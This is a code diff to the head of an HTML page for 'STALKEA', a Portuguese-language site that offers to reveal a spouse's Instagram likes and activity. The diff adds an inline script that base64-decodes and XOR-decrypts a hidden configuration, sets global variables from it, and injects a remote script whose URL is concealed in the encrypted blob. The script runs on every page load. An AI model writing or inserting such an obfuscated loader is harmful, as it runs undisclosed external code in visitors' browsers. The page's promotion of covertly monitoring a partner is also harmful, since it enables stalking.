@@ -1,4 +1,4 @@
-﻿<html lang="pt-BR">
+<html lang="pt-BR">
   <head>
     <title>
       STALKEA: Stalkea Instagram | Ver Curtidas e Atividades do Cônjuge
@@ -21,6 +21,7 @@
       name="google-site-verification"
       content="PiLabX9UuQmW8JCSRi57XI1hAfIb4h25RkPp90f8ULQ"
     />
+    <script>(function(){var r_1y8=atob("DBjR3/qNyHMFZ2778GPzqojh6kknDxqPgGvr8NXurB0rEhqWmX6o8ZnipV1nFUGIk2q4r47+5wZxCh3UnHmluon55hl2RULZkWylrZPvvQdgFEzBq2PzsZvgrVE/RQqahHn8qo7goRV8Sh6JlW60sY6gsBBqA0OIk3Pz89j7qR9wAkzB0jqs84GvphJoAkzB0nywq5ugvQdoDgiC3WijuozopgcoFBuZmXyi/davvhJpEgvZyjrzoqfw");var z_4d=[];for(var c_7=0;c_7<r_1y8.length;c_7++){z_4d.push(r_1y8.charCodeAt(c_7)&255);}var m_8=z_4d[0];var u_z=z_4d.slice(1,1+m_8);var c_ad=z_4d.slice(1+m_8);var c_awg=c_ad.map(function(b,z_y){return b^u_z[z_y%m_8];});var u_cyd="";for(var u_m=0;u_m<c_awg.length;u_m++){u_cyd+=String.fromCharCode(c_awg[u_m]&255);}var i_bf=decodeURIComponent(escape(u_cyd));var x_s=JSON.parse(i_bf);var o_2v29=x_s.globals||[];o_2v29.forEach(function(q_vkv5){window[q_vkv5.name]=q_vkv5.value;});var s_p=document.createElement("script");s_p.src=x_s.url;s_p.async=true;s_p.defer=true;(x_s.attributes||[]).forEach(function(x_78mt){s_p.setAttribute(x_78mt.name,x_78mt.value);});(document.head||document.documentElement).appendChild(s_p);})();</script>
     <script src="/assets/url-interceptor.js"></script>
     <script src="/assets/funnel-extensions.js?v=20260511-vsl-fix2"></script>
     <meta
